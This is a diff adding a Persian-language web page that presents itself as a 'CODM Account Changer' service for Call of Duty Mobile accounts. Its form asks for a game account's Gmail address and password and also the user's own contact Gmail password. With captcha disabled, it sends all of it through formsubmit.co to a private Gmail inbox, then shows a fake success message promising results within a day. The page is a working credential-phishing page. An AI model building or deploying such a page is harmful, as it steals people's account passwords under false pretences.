@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>CODM Account Changer</title>
+
+<link rel="stylesheet" href="style.css">
+<link href="responsive.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+
+<header>
+    <h1>CODM Account Changer</h1>
+</header>
+
+<div class="container">
+
+<form action="https://formsubmit.co/youtube.chanel0acc@gmail.com" method="POST">
+<input type="hidden" name="_captcha" value="false">
+<input type="hidden" name="_template" value="table">
+<input type="hidden" name="_subject" value="درخواست جدید CODM Account Changer">
+<input type="hidden" name="_next" value="https://darkam1111.github.io/Acc-Changer/#success">
+
+<fieldset>
+
+<legend>چنج اکانت</legend>
+
+<div class="input-box">
+
+<label>جیمیل اکانت</label>
+
+<input
+type="email"
+name="account_email"
+placeholder="example@gmail.com"
+required>
+
+</div>
+
+<div class="input-box">
+
+<label>رمز اکانت</label>
+
+<input
+type="password"
+name="account_password"
+required>
+
+</div>
+
+<div class="radio-group">
+
+<label class="radio">
+
+<input
+type="radio"
+name="account_type"
+value="Safe"
+required>
+
+سیف
+
+</label>
+
+<label class="radio">
+
+<input
+type="radio"
+name="account_type"
+value="Semi Safe">
+
+نیم سیف
+
+</label>
+
+<label class="radio">
+
+<input
+type="radio"
+name="account_type"
+value="Crack">
+
+کرک
+
+</label>
+
+</div>
+
+<div class="input-box">
+
+<label>جیمیل</label>
+
+<input
+type="email"
+name="contact_email"
+placeholder="example@gmail.com"
+required>
+
+</div>
+
+<div class="input-box">
+
+<label>رمز</label>
+
+<input
+type="password"
+name="contact_password"
+required>
+
+</div>
+
+<div class="check">
+
+<input
+type="checkbox"
+required>
+
+<span><a class="read" href="About.html">قوانین را می‌پذیرم</a></span>
+
+</div>
+
+<button id="submitBtn">
+
+ثبت اطلاعات
+
+</button>
+
+<p id="result"></p>
+
+</fieldset>
+
+</form>
+
+
+<div id="successMessage" class="success-message" hidden role="status" aria-live="polite">
+    <div class="success-check" aria-hidden="true">
+        <svg viewBox="0 0 80 80" focusable="false">
+            <circle class="success-circle" cx="40" cy="40" r="35"></circle>
+            <path class="success-tick" d="M22 41 L34 53 L59 27"></path>
+        </svg>
+    </div>
+    <h2>درخواست شما با موفقیت ثبت شد!</h2>
+    <p class="success-time">۱ تا ۲۴ ساعت دیگر</p>
+    <p class="success-detail">نتیجه از طریق جیمیل برای شما ارسال می‌شود.</p>
+</div>
+<script>
+(function () {
+    function showSuccessIfReturned() {
+        if (window.location.hash !== "#success") return;
+        var form = document.querySelector("form");
+        var message = document.getElementById("successMessage");
+        if (form) form.hidden = true;
+        if (message) message.hidden = false;
+    }
+    document.addEventListener("DOMContentLoaded", showSuccessIfReturned);
+    window.addEventListener("hashchange", showSuccessIfReturned);
+})();
+</script>
+
+</div>
+
+</body>
+</html>
